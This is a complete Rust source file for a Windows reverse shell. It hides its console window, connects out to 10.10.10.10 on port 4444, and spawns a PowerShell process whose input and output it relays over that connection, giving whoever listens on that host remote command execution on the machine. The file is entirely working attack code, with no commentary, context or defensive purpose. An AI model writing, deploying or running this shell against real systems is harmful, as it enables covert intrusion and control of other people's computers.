#![windows_subsystem = "windows"]
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{Read, Write};
use std::sync::{Arc, Mutex};
use std::thread;


fn main() {
    

    let stream = TcpStream::connect("10.10.10.10:4444").expect("Failed to connect");

    let mut child = Command::new("powershell.exe")
        .args(&["-Sta", "-Nop", "-Command", "-"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::inherit())
        .spawn()
        .expect("Failed to spawn process");

    let mut child_stdin = child.stdin.take().expect("Failed to open stdin");
    let mut child_stdout = child.stdout.take().expect("Failed to open stdout");

    let stream_reader = Arc::new(Mutex::new(stream.try_clone().expect("Failed to clone TCP stream")));
    let reader_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        let mut stream = stream_reader.lock().unwrap();
        loop {
            match stream.read(&mut buffer) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    child_stdin.write_all(&buffer[..n]).unwrap();
                    child_stdin.flush().unwrap();
                }
            }
        }
    });

    let stream_writer = Arc::new(Mutex::new(stream));
    let writer_thread = thread::spawn(move || {
        let mut buffer = [0; 1024];
        let mut stream = stream_writer.lock().unwrap();
        loop {
            match child_stdout.read(&mut buffer) {
                Ok(0) | Err(_) => break,
                Ok(n) => {
                    stream.write_all(&buffer[..n]).unwrap();
                    stream.flush().unwrap();
                }
            }
        }
    });

    let _ = child.wait();

    reader_thread.join().expect("Failed to join reader thread");
    writer_thread.join().expect("Failed to join writer thread");
}
